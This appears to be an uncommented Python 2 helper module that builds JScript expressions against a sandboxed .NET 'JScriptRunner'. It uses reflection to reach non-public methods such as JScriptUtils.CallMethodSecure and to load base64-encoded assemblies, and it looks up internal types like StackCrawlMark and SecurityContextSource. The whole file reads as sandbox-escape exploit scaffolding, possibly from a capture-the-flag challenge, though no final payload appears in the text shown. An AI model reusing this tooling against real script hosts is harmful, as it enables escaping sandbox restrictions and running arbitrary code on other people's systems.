# Helper functions
def MakeArray(*args):
    return "array({})".format(', '.join([str(arg) for arg in args]))


def convert_arg(arg):
    if isinstance(arg, basestring):
        return '"{}"'.format(arg)
    elif isinstance(arg, bool):
        return str(arg).lower()
    elif isinstance(arg, (int, long)):
        return str(arg)
    elif isinstance(arg, list):
        return MakeArray(*arg)

    raise Exception("Unconvertible argument!")


# Generic types and objects
null = 'null'
this = 'this'
Object = '__global__.System.Object'
JScriptUtils = '__global__.JScriptRunner.JScriptUtils'
GetMethod_func = '__global__.JScriptRunner.JScriptUtils.GetMethod'
CallMethod_func = '__global__.JScriptRunner.JScriptUtils.CallMethod'
Array = '__global__.System.Array'
AppDomain = '__global__.System.AppDomain'
String = '__global__.System.String'
Type = '__global__.System.Type'
CurrentDomain = '__global__.System.AppDomain.CurrentDomain'


# Infra functions
def MakeArgsArrayList(obj, name, boolean, *args):
    return [obj, convert_arg(name), convert_arg(boolean), MakeArray(*args)]

def MakeArgsArray(obj, name, boolean, *args):
    return MakeArray(*MakeArgsArrayList(obj, name, boolean, *args))


def GetMethod(target_object, name, static_type, case_sensitive, non_public, args):
    return '{func}({target_object}, {name}, {static_type}, {case_sensitive}, {non_public}, {args})'.format(
        func=GetMethod_func,
        target_object=target_object,
        name=convert_arg(name),
        static_type=convert_arg(static_type),
        case_sensitive=convert_arg(case_sensitive),
        non_public=convert_arg(non_public),
        args=args,
    )


def CallMethodImpl(method, target, *args):
    return '{func}({method}, {target}, {args})'.format(
        func=CallMethod_func,
        method=method,
        target=target,
        args=MakeArray(*args),
    )


def CallMethod(target_object, name, *args):
    return '{func}({target_object}, {name}, true, {args})'.format(
        func=CallMethod_func,
        target_object=target_object,
        name=convert_arg(name),
        args=MakeArray(*args),
    )


CallMethodSecure_func = GetMethod(JScriptUtils, "CallMethodSecure", True, True, True, MakeArgsArray(Object, "asdf", True))
def CallMethodSecure(target_object, name, *args):
    return CallMethodImpl(CallMethodSecure_func, JScriptUtils, *MakeArgsArrayList(target_object, name, True, *args))


ArrayGetValue_func = GetMethod(Array, "GetValue", False, True, False, MakeArray(1))
def ArrayGetValue(array, index):
    return CallMethodImpl(ArrayGetValue_func, array, index)


GetLength_func = GetMethod(Array, "GetLength", False, True, False, MakeArray(1))
def ArrayGetLength(array, dimension=0):
    return CallMethodImpl(GetLength_func, array, dimension)


WriteLine_func = '__global__.System.Console.WriteLine'
def WriteLine(s):
    return '{func}({s})'.format(
        func=WriteLine_func,
        s=s,
    )


Join_func = '__global__.System.String.Join'
def Join(arr, delim='\\n'):
    return '{func}({delim}, {arr})'.format(
        func=Join_func,
        delim=convert_arg(delim),
        arr=arr,
    )


GetAssemblies_func = GetMethod(AppDomain, "GetAssemblies", False, True, False, MakeArray())
def GetAssemblies():
    return CallMethodImpl(GetAssemblies_func, CurrentDomain)


GetFlags_func = GetMethod(JScriptUtils, "GetFlags", True, True, True, MakeArray('true', 'true', 'true'))
def GetFlags(static_type, case_sensitive, non_public):
    return CallMethodImpl(GetFlags_func, JScriptUtils, convert_arg(static_type), convert_arg(case_sensitive), convert_arg(non_public))


FromBase64String_func = '__global__.System.Convert.FromBase64String'
def Base64Decode(s):
    return '{func}({s})'.format(
        func=FromBase64String_func,
        s=convert_arg(s),
    )


FindType_func = '__global__.JScriptRunner.JScriptUtils.FindType'
def FindType(t):
    return '{func}({t}, true)'.format(
        func=FindType_func,
        t=convert_arg(t),
    )


def LoadAssembly(s):
    return CallMethodSecure(AssemblyType, "Load", Base64Decode(s))


def InvokeStaticMethod(method, *args):
    return CallMethodSecure(method, "Invoke", MakeArray(*args))


GetConstructors_func = GetMethod(Type, "GetConstructors", False, True, False, MakeArray())
def GetConstructors(t):
    return CallMethodImpl(GetConstructors_func, t)


StackCrawlMarkType = FindType("System.Threading.StackCrawlMark")
ByteArrayType = FindType("System.Byte[]")
BindingFlagsType = FindType('System.Reflection.BindingFlags')
RuntimeAssemblyType = FindType("System.Reflection.RuntimeAssembly")
AssemblyType = FindType("System.Reflection.Assembly")
SCCType = FindType("System.Security.SecurityContextSource")
int32 = FindType("System.Int32")
EvidenceType = FindType("System.Security.Policy.Evidence")
BooleanType = FindType("System.Boolean")
EntryPointType = FindType("JScriptRunner.EntryPoint")
FieldInfoType = FindType("System.Reflection.FieldInfo")
PropertyInfoType = FindType("System.Reflection.PropertyInfo")
MethodInfoType = FindType('System.Reflection.MethodInfo')
RuntimeMethodHandleType = FindType("System.RuntimeMethodHandle")
ExceptionType = FindType("System.Exception")
JScriptGlobalType = FindType("JScriptRunner.JScriptGlobal")
ExpressionResolverType = FindType("JScriptRunner.ExpressionResolver")
ConstructorInfoType = FindType('System.Reflection.ConstructorInfo')

MakeByRefType = GetMethod(Type, "MakeByRefType", False, True, False, MakeArray())
StackCrawlMarkTypeRef = CallMethodImpl(MakeByRefType, StackCrawlMarkType)

DefaultBinder = '__global__.System.Type.DefaultBinder'
CurrentCulture = '__global__.System.Globalization.CultureInfo.CurrentCulture'
ExceptionObj = '__global__.System.Exception()'

GetMethods = GetMethod(Type, "GetMethods", False, True, False, MakeArray(GetFlags(True, True, True)))